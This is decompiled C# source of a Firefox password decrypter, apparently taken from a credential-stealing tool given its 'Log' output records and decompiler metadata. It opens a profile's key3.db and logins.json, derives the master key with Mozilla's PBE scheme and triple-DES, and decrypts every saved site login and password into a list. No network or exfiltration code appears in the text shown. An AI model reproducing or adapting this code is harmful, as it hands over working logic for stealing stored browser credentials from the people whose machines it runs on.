using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using Dodjins;
using MainModule.Classes;

namespace Decrypt
{
	// Token: 0x0200003E RID: 62
	public class FireFox : IPasswordDecrypter
	{
		// Token: 0x06000167 RID: 359 RVA: 0x00007AF0 File Offset: 0x00005CF0
		public FireFox(string profilePath)
		{
			bool flag = Directory.Exists(profilePath);
			if (!flag)
			{
				throw new ArgumentException(string.Format("Folder \"{0}\" not exists", profilePath));
			}
			this.Profile = profilePath;
			bool flag2 = File.Exists(Path.Combine(profilePath, "key3.db"));
			if (!flag2)
			{
				throw new ArgumentException("key3.db not exists in this folder");
			}
			this.Key3Db = Path.Combine(profilePath, "key3.db");
			bool flag3 = File.Exists(Path.Combine(profilePath, "logins.json"));
			if (flag3)
			{
				this.LoginJson = Path.Combine(profilePath, "logins.json");
				return;
			}
			throw new ArgumentException("key3.db not exists in this folder");
		}

		// Token: 0x06000168 RID: 360 RVA: 0x00007B94 File Offset: 0x00005D94
		public List<Log> GetPasswords()
		{
			List<Log> result;
			try
			{
				List<Log> list = new List<Log>();
				DataTable dataTable = new DataTable();
				Asn1Der asn1Der = new Asn1Der();
				BerkeleyDB berkeleyDB = new BerkeleyDB(this.Key3Db);
				PasswordCheck passwordCheck = new PasswordCheck((from p in berkeleyDB.Keys
				where p.Key.Equals("password-check")
				select p.Value).FirstOrDefault<string>().Replace("-", string.Empty));
				string hexString = (from p in berkeleyDB.Keys
				where p.Key.Equals("global-salt")
				select p.Value).FirstOrDefault<string>().Replace("-", string.Empty);
				MozillaPBE mozillaPBE = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(hexString), Encoding.ASCII.GetBytes(string.Empty), ByteHelper.ConvertHexStringToByteArray(passwordCheck.EntrySalt));
				mozillaPBE.Compute();
				string text = TripleDESHelper.DESCBCDecryptor(mozillaPBE.Key, mozillaPBE.IV, ByteHelper.ConvertHexStringToByteArray(passwordCheck.Passwordcheck));
				string hexString2 = (from p in berkeleyDB.Keys
				where !p.Key.Equals("global-salt") && !p.Key.Equals("Version") && !p.Key.Equals("password-check")
				select p.Value).FirstOrDefault<string>().Replace("-", "");
				Asn1DerObject asn1DerObject = asn1Der.Parse(ByteHelper.ConvertHexStringToByteArray(hexString2));
				MozillaPBE mozillaPBE2 = new MozillaPBE(ByteHelper.ConvertHexStringToByteArray(hexString), Encoding.ASCII.GetBytes(string.Empty), asn1DerObject.objects[0].objects[0].objects[1].objects[0].Data);
				mozillaPBE2.Compute();
				byte[] dataToParse = TripleDESHelper.DESCBCDecryptorByte(mozillaPBE2.Key, mozillaPBE2.IV, asn1DerObject.objects[0].objects[1].Data);
				Asn1DerObject asn1DerObject2 = asn1Der.Parse(dataToParse);
				Asn1DerObject asn1DerObject3 = asn1Der.Parse(asn1DerObject2.objects[0].objects[2].Data);
				byte[] array = new byte[24];
				bool flag = asn1DerObject3.objects[0].objects[3].Data.Length > 24;
				if (flag)
				{
					Array.Copy(asn1DerObject3.objects[0].objects[3].Data, asn1DerObject3.objects[0].objects[3].Data.Length - 24, array, 0, 24);
				}
				else
				{
					array = asn1DerObject3.objects[0].objects[3].Data;
				}
				RootObject rootObject = File.ReadAllText(this.LoginJson).ParseJSON<RootObject>();
				foreach (Login login in rootObject.logins)
				{
					Asn1DerObject asn1DerObject4 = asn1Der.Parse(Convert.FromBase64String(login.encryptedUsername));
					Asn1DerObject asn1DerObject5 = asn1Der.Parse(Convert.FromBase64String(login.encryptedPassword));
					string text2 = TripleDESHelper.DESCBCDecryptor(array, asn1DerObject4.objects[0].objects[1].objects[1].Data, asn1DerObject4.objects[0].objects[2].Data);
					text2 = Regex.Replace(text2, "[^\\u0020-\\u007F]", string.Empty);
					string text3 = TripleDESHelper.DESCBCDecryptor(array, asn1DerObject5.objects[0].objects[1].objects[1].Data, asn1DerObject5.objects[0].objects[2].Data);
					text3 = Regex.Replace(text3, "[^\\u0020-\\u007F]", string.Empty);
					Log log = new Log
					{
						URL = (string.IsNullOrWhiteSpace(login.hostname) ? "UNKOWN" : login.hostname),
						Login = (string.IsNullOrWhiteSpace(text2) ? "UNKOWN" : text2),
						Password = (string.IsNullOrWhiteSpace(text3) ? "UNKOWN" : text3)
					};
					bool flag2 = log.Login != "UNKOWN" && log.Password != "UNKOWN" && log.URL != "UNKOWN";
					if (flag2)
					{
						list.Add(log);
					}
				}
				result = list;
			}
			catch
			{
				result = new List<Log>();
			}
			return result;
		}

		// Token: 0x040000C2 RID: 194
		private string Profile;

		// Token: 0x040000C3 RID: 195
		private string Key3Db;

		// Token: 0x040000C4 RID: 196
		private string LoginJson;
	}
}
